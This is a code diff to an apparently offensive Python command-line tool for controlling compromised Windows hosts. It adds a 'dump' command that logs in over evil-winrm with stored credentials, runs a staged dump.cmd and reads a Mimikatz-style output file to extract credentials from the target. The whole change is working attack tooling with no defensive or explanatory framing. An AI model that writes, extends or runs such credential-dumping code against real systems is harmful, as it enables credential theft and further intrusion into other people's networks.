@@ -131,6 +131,20 @@ def screenshot(target_ip):
     except:
         print("[-] Failed to save screenshot")
 
+def credential_dump(target_ip):
+    print("[*] Executing dump.cmd in the target and extracting results...")
+    try: 
+        payload = 'C:\\Users\\Public\\dump.cmd | Get-Content C:\\Users\\Public\\mimi_output.txt'
+
+
+        subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload,
+            text=True,
+            capture_output=True,
+        )
+    except:
+       print("[-] Failed to dump credentials") 
 
 def cli():
     username = getpass.getuser()
@@ -181,7 +195,10 @@ def cli():
                 screenshot(current_target)
         
         elif cmd == "dump":
-            print("In progress...")
+            if not current_target:
+                print("[-] No target connected. Use 'listen' first.")
+            else:
+                credential_dump(current_target)
 
         elif cmd == "":
             continue
